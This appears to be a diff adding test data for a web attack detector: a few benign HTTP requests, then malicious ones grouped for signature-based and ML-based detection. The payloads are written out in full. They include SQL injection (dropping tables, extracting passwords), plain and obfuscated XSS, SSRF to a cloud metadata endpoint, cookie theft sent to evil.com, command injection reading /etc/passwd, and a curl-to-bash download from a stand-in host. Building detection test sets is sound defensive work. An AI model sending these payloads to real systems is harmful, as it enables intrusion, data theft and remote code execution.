@@ -1,0 +1,93 @@
+GET / HTTP/1.1
+Host: www.example.com
+
+GET /products?category=electronics&page=2 HTTP/1.1
+Host: www.ecommerce.com
+Referer: https://www.ecommerce.com/products
+
+POST /cart/add HTTP/1.1
+Host: www.ecommerce.com
+Content-Type: application/json
+Content-Length: 45
+
+{"productId": "12345", "quantity": 1}
+
+❌Signature-Based Detection (Malicious Input)
+1. SQL Injection via search
+
+GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1
+Host: www.example.com
+2. XSS in comment
+
+GET /comment?text=<script>alert('XSS')</script> HTTP/1.1
+Host: www.example.com
+3. XSS using eval
+
+GET /comment?text=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script> HTTP/1.1
+Host: www.example.com
+4. SQL Injection with UNION
+
+GET /search?q=1' UNION SELECT username,password FROM users-- HTTP/1.1
+Host: www.example.com
+
+ML-based Anomaly Detection (Obfuscated Malicious Input/Encoded Attacks)
+1. URL-encoded SQLi
+
+GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1
+Host: www.example.com
+2. Hex-encoded SQLi
+
+GET /search?q=\x27\x20OR\x20\x31\x3D\x31 HTTP/1.1
+Host: www.example.com
+3. Obscure HTML Elements + JS Access
+
+GET /comment?text=<details%20open%20ontoggle=Function('ale'+'rt(1)')()> HTTP/1.1
+4. Encoded XSS
+
+GET /comment?text=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
+Host: www.example.com
+
+GET /login?username=admin'--&password=123 HTTP/1.1
+Host: www.example.com
+
+GET /search?q=' OR '1'='1';-- HTTP/1.1
+Host: www.example.com
+
+GET /items?id=1' UNION SELECT username,password FROM users-- HTTP/1.1
+Host: www.example.com
+
+GET /search?q=<script>alert('XSS')</script> HTTP/1.1
+Host: www.example.com
+
+GET /search?q=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E HTTP/1.1
+Host: www.example.com
+
+GET /profile?bio=<img src=x onerror=alert(1)> HTTP/1.1
+Host: www.example.com
+
+GET /proxy?url=http://127.0.0.1:8000/internal HTTP/1.1
+Host: www.example.com
+
+GET /proxy?url=http://localhost/admin HTTP/1.1
+Host: www.example.com
+
+GET /proxy?url=http://169.254.169.254/latest/meta-data HTTP/1.1
+Host: www.example.com
+
+GET /?q=<script>fetch('http://evil.com?c='+document.cookie)</script> HTTP/1.1
+Host: www.example.com
+
+GET /?q=<img src=x onerror="location='http://attacker.com?cookie='+document.cookie"> HTTP/1.1
+Host: www.example.com
+
+GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1
+Host: www.example.com
+
+GET /exec?cmd=ls|whoami HTTP/1.1
+Host: www.example.com
+
+POST /submit HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+
+data=;curl http://evil.com/script.sh|bash
